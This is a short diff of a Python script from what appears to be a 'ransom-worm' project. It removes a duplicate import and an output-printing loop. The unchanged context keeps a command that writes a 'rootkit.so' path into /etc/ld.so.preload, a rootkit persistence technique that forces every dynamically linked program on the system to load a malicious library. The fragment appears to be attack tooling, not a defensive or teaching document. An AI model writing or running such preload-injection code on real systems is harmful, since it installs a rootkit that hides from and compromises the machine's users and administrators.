@@ -4,7 +4,6 @@
 
 from pathlib import Path
 import subprocess
-from pathlib import Path
 import time
 
 ###########################################################################################################################
@@ -51,12 +50,6 @@ def run():
         process,
         "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
     )
-
-    # read output
-    output = process.stdout.readline()
-    while str(output.strip()) != "b'exit'":
-        print(output.strip())
-        output = process.stdout.readline()
 
     # close process
     process.stdin.close()
